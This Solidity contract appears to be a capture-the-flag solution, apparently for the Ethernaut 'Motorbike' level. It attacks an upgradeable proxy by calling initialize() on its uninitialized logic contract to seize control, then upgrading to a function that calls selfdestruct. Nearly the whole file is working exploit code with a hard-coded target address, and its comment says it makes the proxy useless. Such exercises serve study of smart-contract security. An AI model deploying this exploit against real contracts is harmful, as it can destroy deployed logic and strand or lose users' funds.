// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Engine {
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;

}

/**
 * @title MotorbikeExplosion
 * @dev Call the 'initialize' function from within constructor to bypass initializer modifier checks and then proceeds to upgrade with a call to selfdestruct, making the proxy useless since the contract should update itself.
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract MotorbikeExplosion {
    address logic_contract = address(0xc0a4d40e3a641A0FfeDb8AF7231385595326cd49); 
    
    constructor() {
        (bool success,) = logic_contract.call(abi.encodeWithSignature("initialize()"));
        require(success, "Failed to take over contract");
    }

    function exploit(address _proxy) public {
        Engine(_proxy).upgradeToAndCall(address(this), abi.encodeWithSignature("blowUp(address)", msg.sender));
    }

    function blowUp(address payable _to) public {
        selfdestruct(_to);
    }
}